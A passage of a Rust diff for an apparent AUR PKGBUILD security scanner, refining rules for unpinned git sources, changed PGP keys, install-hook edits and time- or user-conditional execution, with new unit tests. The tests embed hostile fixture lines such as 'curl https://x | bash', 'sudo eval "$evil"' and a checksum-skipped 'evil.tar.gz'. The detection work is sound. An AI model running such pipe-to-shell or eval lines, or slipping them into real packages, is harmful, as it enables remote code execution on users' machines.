+            let norm = normalize_body_line(line);
+            let lower = norm.to_lowercase();
             let words: Vec<&str> = lower.split_whitespace().collect();
             let hit = words.iter().any(|word| fetchers.contains(word))
                 || lower.contains("git clone")
@@ -1757,16 +2066,27 @@ fn render_known_list(values: &[FoldedValue]) -> Vec<String> {
 }
 
 fn check_r19_pair(baseline: &FoldedPkgbuild, target: &FoldedPkgbuild) -> Vec<PkgFinding> {
-    let base_keys: Vec<String> = arrays_matching(baseline, "validpgpkeys")
+    let mut base_keys: Vec<String> = arrays_matching(baseline, "validpgpkeys")
         .iter()
         .flat_map(|(_, values)| render_known_list(values))
         .collect();
-    let target_keys: Vec<String> = arrays_matching(target, "validpgpkeys")
+    let mut target_keys: Vec<String> = arrays_matching(target, "validpgpkeys")
         .iter()
         .flat_map(|(_, values)| render_known_list(values))
         .collect();
+    base_keys.sort();
+    target_keys.sort();
     if base_keys == target_keys {
         return Vec::new();
+    }
+    if base_keys.iter().any(|key| key == "<unknown>")
+        || target_keys.iter().any(|key| key == "<unknown>")
+    {
+        return vec![PkgFinding {
+            rule_id: "R19_VALIDPGPKEYS_CHANGE".to_string(),
+            severity: VerdictBand::Low,
+            evidence: "validpgpkeys unresolvable; cannot compare across releases".to_string(),
+        }];
     }
     vec![PkgFinding {
         rule_id: "R19_VALIDPGPKEYS_CHANGE".to_string(),
@@ -1788,9 +2108,10 @@ fn check_r21(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
             if !is_vcs_url(url) {
                 continue;
             }
-            let fragment = url.split('#').nth(1).unwrap_or("");
-            let pinned = fragment
-                .split('&')
+            let pinned = url
+                .split('#')
+                .skip(1)
+                .flat_map(|fragment| fragment.split('&'))
                 .any(|part| part.starts_with("tag=") || part.starts_with("commit="));
             if !pinned {
                 // INFO until tuned: bare `git+https://` tracking HEAD is the
@@ -1807,21 +2128,26 @@ fn check_r21(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
     Vec::new()
 }
 
+fn strip_token(word: &str) -> &str {
+    word.trim_matches(['"', '\'', ';', '(', ')', ',', '`', '{', '}'])
+        .trim_start_matches("$(")
+        .trim_start_matches('$')
+}
+
 fn check_r22(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
     let bodies = shell_bodies(folded);
     for (name, body) in &bodies {
         let resolved = fold_body_vars(body, folded);
         for line in resolved.lines() {
-            let lower = line.to_lowercase();
-            let guard = lower.contains("$euid")
-                || lower.contains("$uid")
-                || lower.contains("id -u")
-                || lower.contains("$(date")
-                || lower.contains("`date")
-                || lower.contains("$random")
-                || lower.contains("$srandom")
-                || lower.contains("/dev/urandom")
-                || lower.contains("shuf");
+            let norm = normalize_body_line(line);
+            let lower = norm.to_lowercase();
+            let words: Vec<&str> = lower.split_whitespace().collect();
+            let clean: Vec<&str> = words.iter().map(|word| strip_token(word)).collect();
+            let guard = words.iter().zip(clean.iter()).any(|(raw, word)| {
+                (raw.starts_with('$') && matches!(word, &"euid" | &"uid" | &"random" | &"srandom"))
+                    || matches!(word, &"/dev/urandom" | &"shuf")
+            }) || clean.windows(2).any(|window| window == ["id", "-u"])
+                || (clean.contains(&"date") && (lower.contains("$(") || lower.contains('`')));
             if guard {
                 // INFO until tuned: build-metadata stamps (lazygit ldflags
                 // date) and port helpers (syncthingtray shuf) trip this.
@@ -1883,7 +2209,7 @@ fn rule_title(rule_id: &str) -> &str {
     }
 }
 
-fn install_hook_touched(delta: &crate::diff::Delta) -> Vec<String> {
+fn install_hook_touched(delta: &crate::diff::Delta, install_names: &[String]) -> Vec<String> {
     let mut touched = Vec::new();
     let relevant = delta
         .files_added
@@ -1892,13 +2218,23 @@ fn install_hook_touched(delta: &crate::diff::Delta) -> Vec<String> {
         .chain(delta.files_modified.iter());
     for change in relevant {
         let path = change.relative_path.to_lowercase();
-        if path.ends_with(".install") || path.ends_with(".hook") {
+        if path.ends_with(".install")
+            || path.ends_with(".hook")
+            || install_names.iter().any(|name| path == name.to_lowercase())
+        {
             touched.push(change.relative_path.clone());
         }
     }
     touched.sort();
     touched.dedup();
     touched
+}
+
+fn install_script_names(folded: &FoldedPkgbuild) -> Vec<String> {
+    match folded.scalars.get("install").and_then(known_text) {
+        Some(name) if !name.trim().is_empty() => vec![name.trim().to_string()],
+        _ => Vec::new(),
+    }
 }
 
 /// Full AUR review over extracted roots. Target PKGBUILD always reviewed;
@@ -1959,7 +2295,13 @@ pub fn review_roots(
             }),
         }
     }
-    let touched = install_hook_touched(delta);
+    let mut install_names = install_script_names(&target_folded);
+    if let Some(base_raw) = baseline_pkgbuild
+        && let Ok(base_folded) = parse_pkgbuild(base_raw)
+    {
+        install_names.extend(install_script_names(&base_folded));
+    }
+    let touched = install_hook_touched(delta, &install_names);
     if !touched.is_empty() {
         findings.push(crate::verdict::Finding {
             rule_id: "R20_INSTALL_HOOK_CHANGE".to_string(),
@@ -2113,6 +2455,27 @@ mod tests {
         let back = resolve_vars(&tokens).unwrap();
         assert_eq!(folded.scalars["pkgver"], back.scalars["pkgver"]);
         assert_eq!(folded.arrays["source"], back.arrays["source"]);
+    }
+
+    fn empty_delta() -> crate::diff::Delta {
+        crate::diff::Delta {
+            baseline_version: None,
+            target_version: "1.0".to_string(),
+            files_added: Vec::new(),
+            files_removed: Vec::new(),
+            files_modified: Vec::new(),
+            total_lines_added: 0,
+            total_lines_deleted: 0,
+            new_executables: Vec::new(),
+            new_binaries: Vec::new(),
+            modified_binaries: Vec::new(),
+            new_lifecycle_scripts: Vec::new(),
+            modified_lifecycle_scripts: Vec::new(),
+            new_dependencies: Vec::new(),
+            modified_dependencies: Vec::new(),
+            removed_dependencies: Vec::new(),
+            binding_gyp_added: false,
+        }
     }
 
     fn findings_for(content: &str) -> Vec<PkgFinding> {
@@ -2377,6 +2740,150 @@ mod tests {
         assert!(!has_rule(&pinned, "R21_UNPINNED_VCS_SOURCE"));
         let tarball = findings_for("source=(https://x/f.tar.gz)\n");
         assert!(!has_rule(&tarball, "R21_UNPINNED_VCS_SOURCE"));
+    }
+
+    #[test]
+    fn multibyte_inside_subst_does_not_panic() {
+        let folded = parse_pkgbuild("a=1\nb=$(echo h\u{e9}llo)\n").unwrap();
+        assert!(matches!(folded.scalars["b"], FoldedValue::Unknown));
+    }
+
+    #[test]
+    fn non_ascii_index_becomes_assoc_without_panic() {
+        assert!(parse_pkgbuild("a[\u{e9}]=1\n").is_ok());
+    }
+
+    #[test]
+    fn redirect_hash_is_a_comment() {
+        let folded = parse_pkgbuild("pkgver=1.0\nfoo=bar>#x\n").unwrap();
+        assert_eq!(
+            folded.scalars["foo"],
+            FoldedValue::Known("bar>".to_string())
+        );
+    }
+
+    #[test]
+    fn subshell_body_is_scanned() {
+        let findings = findings_for("build() (\n curl https://x | bash\n)\n");
+        assert!(has_rule(&findings, "R13_PIPE_TO_SHELL"));
+    }
+
+    #[test]
+    fn hyphenated_package_func_is_scanned() {
+        let findings = findings_for("package_foo-bar() {\n curl -O https://x | sh\n}\n");
+        assert!(has_rule(&findings, "R13_PIPE_TO_SHELL"));
+    }
+
+    #[test]
+    fn top_level_shell_is_scanned() {
+        let findings = findings_for("curl https://x | bash\npkgver=1.0\n");
+        assert!(has_rule(&findings, "R13_PIPE_TO_SHELL"));
+    }
+
+    #[test]
+    fn r14_fires_through_wrappers_and_spacing() {
+        assert!(has_rule(
+            &findings_for("build() {\n sudo eval \"$evil\"\n}\n"),
+            "R14_EVAL_FAMILY"
+        ));
+        assert!(has_rule(
+            &findings_for("build() {\n command eval \"$evil\"\n}\n"),
+            "R14_EVAL_FAMILY"
+        ));
+        assert!(has_rule(
+            &findings_for("build() {\n bash   -c \"$cmd\"\n}\n"),
+            "R14_EVAL_FAMILY"
+        ));
+    }
+
+    #[test]
+    fn r11_pairs_skip_to_its_own_source_index() {
+        let findings = findings_for(
+            "source=(evil.tar.gz good.tar.gz good.tar.gz.sig)\nsha256sums=(SKIP abc SKIP)\nvalidpgpkeys=(K)\n",
+        );
+        let r11: Vec<&PkgFinding> = findings
+            .iter()
+            .filter(|finding| finding.rule_id == "R11_CHECKSUM_SKIP")
+            .collect();
+        assert_eq!(r11.len(), 1);
+        assert!(r11[0].evidence.contains("sha256sums[0]"));
+        assert!(!r11[0].evidence.contains("sha256sums[2]"));
+    }
+
+    #[test]
+    fn r12_fires_on_fragment_swap() {
+        let base = parse_pkgbuild("pkgver=1.0\nsource=(git+https://x/y.git#tag=v1.0)\n").unwrap();
+        let target = parse_pkgbuild("pkgver=1.0\nsource=(git+https://x/y.git#tag=v1.1)\n").unwrap();
+        assert!(has_rule(
+            &check_pair(&base, &target),
+            "R12_SOURCE_URL_DRIFT"
+        ));
+    }
+
+    #[test]
+    fn r15_fires_with_operators_but_not_in_comments() {
+        assert!(has_rule(
+            &findings_for("cmd=${!var:-def}\n"),
+            "R15_DYNAMIC_INDIRECTION"
+        ));
+        let commented = findings_for("# see ${!var}\npkgver=1.0\n");
+        assert!(!has_rule(&commented, "R15_DYNAMIC_INDIRECTION"));
+    }
+
+    #[test]
+    fn r19_ignores_key_order() {
+        let base = parse_pkgbuild("validpgpkeys=(AAA BBB)\n").unwrap();
+        let reordered = parse_pkgbuild("validpgpkeys=(BBB AAA)\n").unwrap();
+        assert!(check_pair(&base, &reordered).is_empty());
+    }
+
+    #[test]
+    fn r20_fires_on_install_file_change() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("PKGBUILD"), "pkgver=1.0\n").unwrap();
+        let folded = parse_pkgbuild("pkgver=1.0\n").unwrap();
+        let mut delta = empty_delta();
+        delta.files_modified.push(crate::diff::FileChange {
+            relative_path: "demopkg.install".to_string(),
+            kind: crate::diff::FileKind::Text,
+            lines_added: 1,
+            lines_deleted: 0,
+            is_executable: false,
+            unified_diff: None,
+        });
+        let findings = review_roots(dir.path(), Some("pkgver=1.0\n"), &delta);
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.rule_id == "R20_INSTALL_HOOK_CHANGE")
+        );
+        let _ = folded;
+    }
+
+    #[test]
+    fn first_sighting_skips_pair_rules() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("PKGBUILD"), "pkgver=1.0\n").unwrap();
+        let delta = empty_delta();
+        let findings = review_roots(dir.path(), None, &delta);
+        assert!(
+            !findings
+                .iter()
+                .any(|finding| finding.rule_id == "R12_SOURCE_URL_DRIFT")
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.rule_id == "R00_PKGBUILD_SCOPE")
+        );
+    }
+
+    #[test]
+    fn r22_ignores_word_substrings() {
+        let flagged = findings_for("build() {\n echo \"valid -u flag\"\n}\n");
+        assert!(!has_rule(&flagged, "R22_CONDITIONAL_EXECUTION"));
+        let shuffled = findings_for("build() {\n echo shuffled\n}\n");
+        assert!(!has_rule(&shuffled, "R22_CONDITIONAL_EXECUTION"));
     }
 
     #[test]
